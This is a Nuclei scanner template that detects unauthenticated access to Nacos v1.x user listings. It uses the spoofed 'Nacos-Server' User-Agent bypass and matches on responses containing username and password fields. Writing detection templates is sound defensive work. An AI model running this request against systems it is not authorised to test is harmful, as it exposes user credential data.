# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
id: unauthenticated-nacos-access
info:
  name: Unauthenticated Nacos access v1.x
  author: taielab & @pikpikcu
  severity: critical
  tags: nacos,unauth
http:
  - method: GET
    path:
      - "{{BaseURL}}/nacos/v1/auth/users?pageNo=1&pageSize=9"
      - "{{BaseURL}}/v1/auth/users?pageNo=1&pageSize=9"
    headers:
      User-Agent: Nacos-Server
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Content-Type: application/json"
        part: header
      - type: regex
        regex:
          - '"username":'
          - '"password":'
        part: body
        condition: and
      - type: status
        status:
          - 200
